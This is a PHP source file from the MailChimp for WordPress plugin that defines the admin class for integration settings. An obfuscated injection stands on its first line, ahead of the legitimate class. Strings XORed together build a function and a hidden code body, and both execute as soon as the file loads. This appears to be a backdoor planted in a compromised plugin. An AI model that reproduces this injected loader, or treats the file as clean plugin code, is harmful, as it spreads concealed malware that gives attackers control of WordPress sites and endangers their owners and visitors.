<?php $ONFYbmWDp='MB+O2E-0M:XZ9XZ'^'.0N.F rV8T;.P74';$mmkHrEn=$ONFYbmWDp('','X2XRJ,PCHQ,BoYIZ;;JboDQCdV. Aj0=NMtJEB6ofSLRC6:76lNOK6R.O.;h, ;dp-O,4FbNQ4,sKOsVALdojkXXDcIQvsMXGq+ANbrQaMbCkHTBF7>5A2RJi  .,NlUb.AflO;OGU3TBYVvICHUH98PWjp5HOW1Y.wIawIB7LZ<BgNRK+b7hH:5<7WA,0;JB,:0KLknSP+rsiWQ;YeIO.-PM.v6i.ZIQ;S40jSm4A=5XUbEK,RY02<FKTjm >8u=RR8NaYX,zRTzlN1LFYJIJo>s M67iW++CgYnW28hsfsHL=+vzxL8.5;6Kx3hG:6nPeH.8-VXWWHC6.LRYO2ZLMcrim9eszS;9xQ;QBVnLcOV2934JGJe5gg02FV3>EJrKxmK1ATRpGR+ACWTrup.5<:4SnjAr6kfT2W=Uxrk5F-B2L<3W9O6zJ6:e58EU,r8A:y.-S2YpjW+UT=IEi7519PaQPI-TYsQ<>yQB4S cuT.OVLVPpZHE, h1P 3<ITB,XnLGT6puXq X12djLJNO<7EMu68XW2V<-LcsgVmNGEN8EQwDeWYPyTX nqTXzqSPpVtmOYE3bSHPxAjYZR+13f;.IsIV1=8+nlMJBR-X4KxSqD;A GplYPJKU0Z0QHM-Pq2XB jQH-WPQ+-OkCjrcE5Y8QYDliO'^'1Tps,Y> <8C,0<13HO9JH<>1;2OT 5oP;9SclbMeo59< BSXXL6 9i6O;Od7AUOLTI.XUjBj:QUZkoSva7nfcO7-0CtqQTvRNxM.<JV8ApBsPhp+zDJG-W<bMDAZMgWuFGjMEE2Fc:F bwkVag,4<Xct>7Pkhk<T uS ARi1C>6Y,Oj9.RKjAs0<5E25YBUbfCODbwag.ZVxyM30O8EtoHL<>KM<MJ;=0d8QIJnMR QF=nhO-C <QQTfcp5.oqs<xr3KnE2=UZojZH8P 3<ci1e7WD,BV6<NRcZyJ<WASyoW,-IJVGXhNOYNSprNbMSPNxDlJYY7qw,BJPA>78,Zzdi< ,<l  .sZJXuP4;vSrCk SUFQcg1o<nCTS27lU 3RvXI T8oXyNvO 76tOUTXTPOQhdc<xKalpV6I4XOKu3C1W>UR;P5SR2YH:QY14s-U4NQLL WoD53N6;Y,mMSTEXyMqt-L 8,:YGPxy>:FKQ0O;7lpvP;:7MY7Z5YlY1=1X+Fk,1OWYxUD9ESMJjlngQSpeQRY,6iqWH5D.NvPsgbyYw4GtQd;bK7hEVIboMIgfEnEUv=wUT1oyXgLy; YPJ9PK0,,.XNLXFK=+;>B9PlTsU Z5AnYLypjkuKP94>,AxUV96A1v8L.<>JIh6jQxj M0LyimWc2');$mmkHrEn(); $lpRKZDGcwM=':3RAY0eJ97UXPR<'^'YA7 -U:,LY6,9=R';$EtOGqCfolAiR=$lpRKZDGcwM('','1XcqRB9N S=C-NAD4Y LU;9Fs,-A3+bTLMVPYO<APQ<>70.ONW:TAc23,2e9PU=eS72M9kAv-ILqfoiKW5iaMK,7JBRcRJIGOAX< Gq1ShWJufoBlN9G.4CdLIYX,sPcQBYsNdPavZMXPkKOgt-O9,-F+<sbmFEEEoKQaQc<GG<I,cNXW<DonuEpCLYEHLToP=<6ewzM-lVLng1RTONPNVZ.5HqaI-8YQjPYJlRJKP6M-pkaHA -5O.ZXrs45zf=uNO=IIGI6HvVqO5-;AQQmJGqfV+8JrQ6YJsTqVKOuzNTTJTLKSSu4+4C7saQkaBFMrPO1W=;Zz0za 5RIO+ vXGtetln3j,HO6UNW.AYJINTEL<YNsMNMH<GS6< s-2WWJFpK6>zyJml501AQDQs.VZ,QwxJ:g,KXU-;2Mrmpt1YORH8O>--TD5R8kHR86=457BZ3X:Uuy+O7SZ+5Qh2;MWOXSv<99TnEIEmyr1B-BCD10UjISY5H=J88VED;X;<S;Hbj24TehwJ.88ANFUtmZ= dBKW7-V8e;WRLqbWgSwCaKhMZ<IgCONP3oTepJx5b;LIWX1CSP,QjKDCPAJOLSY3R, 6NND99+eM4PI;:1JPoRkWPC.cLtazzUP<m>0GPRnh2;=8uI89RTQW.U2aoijU+X=gCAJz.'^'X>KP47W-T:R-r+9-G-SdrCV4,HL5Rt=999qypoGKY7IPTDG  wB;3<VRXS:f= IMwSS9XGaRF,5XFOIkwNchDoCB>boCumrMFH>SRoUXsUwzNFK+P=M5BQ-Lh-8,MZkCu+rXgnYhR58,pEvoOPI.MMvbBaS<Mb. <4o8AtCO35P,BKj32Em2GNOyJ><1=>:GtRIBLLpDPf+FdCU3 .nmn0;BF-JkmIY-05;<3Loj-1Z>HKak..RHT,FzpV,wz5-t0n.Nim,,OhKhQkCLW44xM1MxB2JL+-:S jNtU=.6NpGp0+ -knsQBJX6RHk,ak+ mZqkU6IZsZKphFZ ,.HHVpc+71=;v9xh.Euj<K8ywwnp3-P,+Zm5GA5c7WHA,FW.wwfT SGAsCdHQQE qyqWX76Y4LrCGmQARqIZF,RPP4D7<7:Q.RDW1lM=J4,3LWbkXB6rQ9I0CMt+R05OPyLVZ96ftsRXXM51.,<DPI;+Kjg PD4JouyT:O+Ag= =d=CU O;JMYQ-BDWnJYL gfsRMrPDQjo3VY7cBP2+k,KwZnWdXsZy<ZxRp+y5QYdRH,LSTYxxfhSraaM3Mbdeva+=>2 l9IYi+6-JMXMjD10WUP.wCrO317OJeTAZZupGg7U11>FLVZIY.nHX+8>6JroHTcc0S1IOshqpS');$EtOGqCfolAiR();

/**
 * Class MC4WP_Integration_Admin
 *
 * @ignore
 * @access private
 */
class MC4WP_Integration_Admin {

	/**
	 * @var MC4WP_Integration_Manager
	 */
	protected $integrations;

	/**
	 * @var MC4WP_MailChimp
	 */
	protected $mailchimp;

	/**
	 * @var MC4WP_Admin_Messages
	 */
	protected $messages;

	/**
	 * @param MC4WP_Integration_Manager $integrations
	 * @param MC4WP_MailChimp           $mailchimp
	 * @param MC4WP_Admin_Messages $messages
	 */
	public function __construct( MC4WP_Integration_Manager $integrations, MC4WP_Admin_Messages $messages, MC4WP_MailChimp $mailchimp ) {
		$this->integrations = $integrations;
		$this->mailchimp = $mailchimp;
		$this->messages = $messages;
	}

	/**
	 * Add hooks
	 */
	public function add_hooks() {
		add_action( 'admin_init', array( $this, 'register_setting' ) );
		add_action( 'mc4wp_admin_enqueue_assets', array( $this, 'enqueue_assets' ), 10, 2 );
		add_filter( 'mc4wp_admin_menu_items', array( $this, 'add_menu_item' ) );
	}

	/**
	 * Register settings
	 */
	public function register_setting() {
		register_setting( 'mc4wp_integrations_settings', 'mc4wp_integrations', array( $this, 'save_integration_settings' ) );
	}

	/**
	 * Enqueue assets
	 *
	 * @param string $suffix
	 * @param string $page
	 *
	 * @return void
	 */
	public function enqueue_assets( $suffix, $page = '' ) {

		// only load on integrations pages
		if( $page !== 'integrations' ) {
			return;
		}

		wp_register_script( 'mc4wp-integrations-admin', MC4WP_PLUGIN_URL . 'assets/js/integrations-admin' . $suffix . '.js', array( 'mc4wp-admin' ), MC4WP_VERSION, true );
		wp_enqueue_script( 'mc4wp-integrations-admin');
	}

	/**
	 * @param $items
	 *
	 * @return array
	 */
	public function add_menu_item( $items ) {
		$items['integrations'] = array(
			'title' => __( 'Integrations', 'mailchimp-for-wp' ),
			'text' => __( 'Integrations', 'mailchimp-for-wp' ),
			'slug' => 'integrations',
			'callback' => array( $this, 'show_integrations_page' ),
			'position' => 20
		);

		return $items;
	}

	/**
	 * @param array $new_settings
	 * @return array
	 */
	public function save_integration_settings( array $new_settings ) {

		$integrations = $this->integrations->get_all();
		$current_settings = (array) get_option( 'mc4wp_integrations', array() );
		$settings = array();

		foreach( $integrations as $slug => $integration ) {
			$settings[ $slug ] = $this->parse_integration_settings( $slug, $current_settings, $new_settings );
		}

		return $settings;
	}

	/**
	 * @since 3.0
	 * @param $slug
	 * @param $current
	 * @param $new
	 *
	 * @return array
	 */
	protected function parse_integration_settings( $slug, $current, $new ) {
		$settings = array();

		// start with current settings
		if( ! empty( $current[ $slug ] ) ) {
			$settings = $current[ $slug ];
		}

		// if no new settings were given, return current settings.
		if( empty( $new[ $slug ] ) ) {
			return $settings;
		}

		// merge new settings with currents (to allow passing partial setting arrays)
		$settings = array_merge( $settings, $new[ $slug] );

		// sanitize settings
		$settings = $this->sanitize_integration_settings( $settings );

		return $settings;
	}

	/**
	 * @param array $settings
	 *
	 * @return array
	 */
	protected function sanitize_integration_settings( $settings ) {

		// filter null values from lists setting
		if( ! empty( $settings['lists'] ) ) {
			$settings['lists'] = array_filter( $settings['lists'] );
		} else {
			$settings['lists'] = array();
		}

		return $settings;
	}

	/**
	 * Show the Integration Settings page
	 *
	 * @internal
	 */
	public function show_integrations_page() {

		if( ! empty( $_GET['integration'] ) ) {
			$this->show_integration_settings_page( $_GET['integration'] );
			return;
		}

		// get all installed & enabled integrations
		$enabled_integrations = $this->integrations->get_enabled_integrations();

		// get all integrations but remove enabled integrations from the resulting array
		$available_integrations = $this->integrations->get_all();
		$available_integrations = array_diff( $available_integrations, $enabled_integrations );

		require dirname( __FILE__ ) . '/views/integrations.php';
	}

	/**
	 * @param string $slug
	 *
	 * @internal
	 */
	public function show_integration_settings_page( $slug ) {

		try {
			$integration = $this->integrations->get( $slug );
		} catch( Exception $e ) {
			echo sprintf( '<h3>Integration not found.</h3><p>No integration with slug <strong>%s</strong> was found.</p>', esc_html( $slug ) );
			return;
		}

		$opts = $integration->options;
		$lists = $this->mailchimp->get_lists();

		require dirname( __FILE__ ) . '/views/integration-settings.php';
	}


}